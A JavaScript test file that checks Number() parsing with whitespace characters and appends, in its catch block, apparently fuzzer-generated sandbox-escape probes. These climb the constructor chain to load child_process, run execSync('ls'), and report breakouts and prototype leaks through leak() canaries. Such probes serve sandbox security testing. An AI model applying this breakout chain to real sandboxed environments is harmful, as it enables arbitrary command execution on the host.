try {
    if (eval('Number\t()') !== 0) {
        $ERROR('#1: Number\\u0009() === 0');
    }
    if (eval('Number\x0B()') !== 0) {
        $ERROR('#2: Number\\u000B() === 0');
    }
    if (eval('Number\f()') !== 0) {
        $ERROR('#3: Number\\u000C() === 0');
    }
    if (eval('Number ()') !== 0) {
        $ERROR('#4: Number\\u0020 === 0');
    }
    if (eval('Number\xA0()') !== 0) {
        $ERROR('#5: Number\\u00A0() === 0');
    }
    if (eval('Number\n()') !== 0) {
        $ERROR('#6: Number\\u000A() === 0');
    }
    if (eval('Number\r()') !== 0) {
        $ERROR('#7: Number\\u000D() === 0');
    }
    if (eval('Number\u2028()') !== 0) {
        $ERROR('#8: Number\\u2028() === 0');
    }
    if (eval('Number\u2029()') !== 0) {
        $ERROR('#9: Number\\u2029() === 0');
    }
    if (eval('Number\t\x0B\f \xA0\n\r\u2028\u2029()') !== 0) {
        $ERROR('#10: Number\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u2029() === 0');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}